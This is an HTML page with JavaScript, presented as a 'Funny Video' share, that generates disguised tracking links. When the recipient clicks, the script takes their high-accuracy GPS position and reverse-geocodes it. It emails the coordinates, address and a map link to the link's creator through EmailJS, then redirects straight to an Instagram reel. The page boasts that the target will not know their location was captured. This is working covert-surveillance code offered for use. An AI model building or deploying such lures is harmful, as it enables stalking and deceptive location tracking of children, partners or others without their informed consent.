<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Funny Video üòÇ</title>
    
    <!-- Open Graph meta tags for social media preview - these will be dynamically updated -->
    <meta property="og:title" content="Check out this funny video! üòÇ">
    <meta property="og:description" content="You have to see this! So hilarious ü§£">
    <meta property="og:image" content="">
    <meta property="og:url" content="">
    <meta property="og:type" content="website">
    
    <!-- Twitter Card meta tags -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Check out this funny video! üòÇ">
    <meta name="twitter:description" content="You have to see this! So hilarious ü§£">
    <meta name="twitter:image" content="">
    
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
        }

        .card {
            background: white;
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        h1 {
            color: #667eea;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
        }

        input[type="email"],
        input[type="text"],
        input[type="url"] {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
        }

        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
        }

        button:hover:not(:disabled) {
            background: #5568d3;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
        }

        button:disabled {
            background: #cbd5e0;
            cursor: not-allowed;
            opacity: 0.7;
        }

        .link-container {
            background: #f7f9fc;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            display: none;
        }

        .link-container.show {
            display: block;
        }

        .tracking-link {
            background: white;
            padding: 15px;
            border-radius: 6px;
            border: 2px solid #667eea;
            word-break: break-all;
            margin: 10px 0;
            font-family: monospace;
            font-size: 13px;
            line-height: 1.5;
        }

        .copy-btn {
            background: #48bb78;
            margin-top: 10px;
        }

        .copy-btn:hover {
            background: #38a169;
        }

        .hidden {
            display: none;
        }

        .success-message {
            background: #c6f6d5;
            color: #22543d;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            display: none;
            font-weight: 500;
        }

        .success-message.show {
            display: block;
        }

        .setup-box {
            background: #e0e7ff;
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
        }

        .setup-box h3 {
            color: #3730a3;
            margin-bottom: 15px;
            font-size: 18px;
        }

        .setup-box ol {
            margin-left: 20px;
            color: #4338ca;
        }

        .setup-box li {
            margin-bottom: 10px;
            line-height: 1.6;
        }

        .config-inputs {
            margin-top: 15px;
        }

        .config-inputs input {
            margin-bottom: 10px;
            font-family: monospace;
            font-size: 14px;
        }

        .save-config-btn {
            background: #48bb78;
            margin-top: 10px;
            max-width: 200px;
        }

        .note {
            background: #fff5e6;
            border-left: 4px solid #f59e0b;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
        }

        .note-title {
            font-weight: 600;
            color: #92400e;
            margin-bottom: 5px;
        }

        .note-text {
            color: #78350f;
            font-size: 14px;
            line-height: 1.5;
        }

        /* Invisible tracking view - no visible UI elements */
        #childView {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Parent View - Generate Link -->
        <div id="parentView" class="card">
            <h1>üìç Quick Location Tracker</h1>
            <p class="subtitle">Generate a tracking link that automatically gets location and redirects to a funny video.</p>
            
            <div class="input-group">
                <label for="parentEmail">Your Email Address:</label>
                <input type="email" id="parentEmail" placeholder="parent@example.com" required>
            </div>

            <div class="input-group">
                <label for="childName">Child's Name (optional):</label>
                <input type="text" id="childName" placeholder="e.g., Alex">
            </div>

            <div class="input-group">
                <label for="redirectUrl">Instagram Reel URL:</label>
                <input type="url" id="redirectUrl" placeholder="https://www.instagram.com/reel/..." required>
                <small style="color: #666; margin-top: 5px; display: block;">The link will redirect to this Instagram reel after capturing location</small>
            </div>

            <button onclick="generateLink()">üîó Generate Tracking Link</button>

            <div id="successMessage" class="success-message">
                ‚úì Link generated successfully! Share it with your child.
            </div>

            <div id="linkContainer" class="link-container">
                <h3 style="margin-bottom: 10px; color: #333;">Your Tracking Link:</h3>
                <div id="trackingLink" class="tracking-link"></div>
                <button onclick="copyLink()" class="copy-btn">üìã Copy Link</button>
                
                <div class="note" style="margin-top: 15px;">
                    <div class="note-title">üí° How it works:</div>
                    <div class="note-text">
                        When your child clicks this link, it will automatically capture their GPS location in the background and send it to your email, then redirect them to the Instagram reel. They won't see any loading screens or know their location was captured.
                    </div>
                </div>
            </div>

            <div class="setup-box">
                <h3>‚öôÔ∏è EmailJS Configuration</h3>
                <p style="color: #4338ca; margin-bottom: 15px;">Configure your EmailJS account to receive location emails:</p>
                
                <ol>
                    <li>Sign up at <a href="https://www.emailjs.com" target="_blank" style="color: #667eea;">emailjs.com</a></li>
                    <li>Add an email service (Gmail, Outlook, etc.)</li>
                    <li>Create an email template with these variables:
                        <ul style="margin-top: 5px;">
                            <li><code>{{child_name}}</code> - Child's name</li>
                            <li><code>{{latitude}}</code>, <code>{{longitude}}</code> - GPS coordinates</li>
                            <li><code>{{address}}</code> - Formatted address</li>
                            <li><code>{{maps_link}}</code> - Google Maps link</li>
                            <li><code>{{timestamp}}</code> - Capture time</li>
                        </ul>
                    </li>
                    <li>Copy your credentials below:</li>
                </ol>

                <div class="config-inputs">
                    <input type="text" id="publicKey" placeholder="Public Key (from EmailJS dashboard)">
                    <input type="text" id="serviceId" placeholder="Service ID (e.g., service_abc123)">
                    <input type="text" id="templateId" placeholder="Template ID (e.g., template_xyz789)">
                    <button onclick="saveConfig()" class="save-config-btn">üíæ Save Configuration</button>
                </div>

                <div id="configSuccess" class="success-message" style="margin-top: 15px;">
                    ‚úì EmailJS configuration saved!
                </div>
            </div>

            <div class="note">
                <div class="note-title">‚ö†Ô∏è Important Notes:</div>
                <div class="note-text">
                    ‚Ä¢ Location tracking requires permission - the browser will ask your child for GPS access<br>
                    ‚Ä¢ Use responsibly and ensure you have the right to track the person's location<br>
                    ‚Ä¢ Some browsers may block geolocation on non-HTTPS sites<br>
                    ‚Ä¢ The link works on mobile and desktop devices
                </div>
            </div>
        </div>

        <!-- Child View - Invisible tracking -->
        <div id="childView" class="hidden">
            <!-- This div is invisible and exists only to trigger the tracking script -->
        </div>
    </div>

    <script>
        // Configuration storage
        let config = {
            publicKey: '',
            serviceId: '',
            templateId: ''
        };

        // Load saved configuration
        function loadConfig() {
            const saved = localStorage.getItem('emailjs_config');
            if (saved) {
                config = JSON.parse(saved);
                document.getElementById('publicKey').value = config.publicKey;
                document.getElementById('serviceId').value = config.serviceId;
                document.getElementById('templateId').value = config.templateId;
                
                if (config.publicKey) {
                    emailjs.init(config.publicKey);
                }
            }
        }

        // Save configuration
        function saveConfig() {
            config.publicKey = document.getElementById('publicKey').value.trim();
            config.serviceId = document.getElementById('serviceId').value.trim();
            config.templateId = document.getElementById('templateId').value.trim();

            if (!config.publicKey || !config.serviceId || !config.templateId) {
                alert('‚ùå Please fill in all three fields!');
                return;
            }

            localStorage.setItem('emailjs_config', JSON.stringify(config));
            emailjs.init(config.publicKey);
            
            document.getElementById('configSuccess').classList.add('show');
            setTimeout(() => {
                document.getElementById('configSuccess').classList.remove('show');
            }, 3000);
        }

        let trackingData = {};

        // Initialize on page load
        window.addEventListener('load', () => {
            loadConfig();
            
            const urlParams = new URLSearchParams(window.location.search);
            const trackId = urlParams.get('track');
            
            if (trackId) {
                // Child view - INSTANT BACKGROUND CAPTURE AND REDIRECT
                captureInBackground(trackId);
            }
        });

        async function captureInBackground(trackId) {
            // Decode tracking data
            try {
                const decoded = atob(trackId);
                trackingData = JSON.parse(decoded);
                
                // Update Open Graph meta tags for social media preview
                updateMetaTags(trackingData.redirectUrl);
                
                // Try to capture location and send email BEFORE redirecting
                try {
                    await captureAndSendLocation();
                } catch (locationError) {
                    console.error('Failed to capture location:', locationError);
                    // Continue to redirect even if location capture fails
                }
                
                // Now redirect after email attempt
                redirectToVideo();
                
            } catch (e) {
                console.error('Error decoding tracking data:', e);
                // Still redirect even if there's an error
                redirectToVideo();
            }
        }

        function updateMetaTags(redirectUrl) {
            // Update Open Graph tags so social media preview shows the redirect URL
            try {
                const url = new URL(redirectUrl);
                
                // Set OG URL
                document.querySelector('meta[property="og:url"]').setAttribute('content', redirectUrl);
                document.querySelector('meta[property="og:image"]').setAttribute('content', `${url.origin}/favicon.ico`);
                
                // Set Twitter tags
                document.querySelector('meta[name="twitter:image"]').setAttribute('content', `${url.origin}/favicon.ico`);
            } catch (e) {
                console.error('Error updating meta tags:', e);
            }
        }

        async function captureAndSendLocation() {
            try {
                console.log('Starting location capture...');
                
                // Get GPS location with high accuracy
                const position = await new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        reject(new Error('Geolocation not supported'));
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });

                console.log('Location obtained:', position.coords);

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                
                // Get address
                const address = await getAddress(latitude, longitude);
                
                console.log('Address:', address);
                
                // Create Google Maps link
                const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                
                // Get formatted timestamp
                const timestamp = new Date().toLocaleString('en-US', {
                    weekday: 'long',
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });

                // Send email via EmailJS
                const templateParams = {
                    child_name: trackingData.childName,
                    parent_email: trackingData.parentEmail,
                    latitude: latitude.toFixed(6),
                    longitude: longitude.toFixed(6),
                    address: address,
                    maps_link: mapsLink,
                    timestamp: timestamp
                };

                console.log('Sending email with params:', templateParams);

                // Send email and WAIT for it to complete
                const result = await emailjs.send(
                    config.serviceId,
                    config.templateId,
                    templateParams
                );

                console.log('Email sent successfully:', result);

            } catch (error) {
                console.error('Location capture error:', error);
                // Still throw the error so redirect doesn't happen if email fails
                throw error;
            }
        }

        function redirectToVideo() {
            const redirectUrl = trackingData.redirectUrl || 'https://www.instagram.com/reels/';
            // Instant redirect - no delays
            window.location.replace(redirectUrl);
        }

        async function getAddress(lat, lng) {
            try {
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
                    {
                        headers: {
                            'User-Agent': 'LocationTracker/1.0'
                        }
                    }
                );
                
                const data = await response.json();
                
                if (data.display_name) {
                    return data.display_name;
                }
                
                return `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            } catch (error) {
                console.error('Geocoding error:', error);
                return `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            }
        }

        function generateLink() {
            const email = document.getElementById('parentEmail').value.trim();
            const childName = document.getElementById('childName').value.trim() || 'Your Child';
            const redirectUrl = document.getElementById('redirectUrl').value.trim();
            
            if (!email || !isValidEmail(email)) {
                alert('‚ùå Please enter a valid email address');
                return;
            }

            if (!redirectUrl || !isValidUrl(redirectUrl)) {
                alert('‚ùå Please enter a valid Instagram reel URL');
                return;
            }

            if (!config.publicKey || !config.serviceId || !config.templateId) {
                alert('‚ö†Ô∏è Please configure EmailJS first! See the setup instructions above.');
                return;
            }

            // Create tracking data
            const data = {
                parentEmail: email,
                childName: childName,
                redirectUrl: redirectUrl,
                timestamp: new Date().toISOString()
            };

            // Encode data in URL
            const encoded = btoa(JSON.stringify(data));
            const baseUrl = window.location.href.split('?')[0];
            const trackingUrl = `${baseUrl}?track=${encoded}`;

            // Display the link
            document.getElementById('trackingLink').textContent = trackingUrl;
            document.getElementById('linkContainer').classList.add('show');
            document.getElementById('successMessage').classList.add('show');
            
            setTimeout(() => {
                document.getElementById('successMessage').classList.remove('show');
            }, 5000);
        }

        function copyLink() {
            const linkText = document.getElementById('trackingLink').textContent;
            navigator.clipboard.writeText(linkText).then(() => {
                const btn = event.target;
                const originalText = btn.textContent;
                btn.textContent = '‚úì Copied!';
                setTimeout(() => {
                    btn.textContent = originalText;
                }, 2000);
            });
        }

        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function isValidUrl(url) {
            try {
                new URL(url);
                return true;
            } catch {
                return false;
            }
        }
    </script>
</body>
</html>
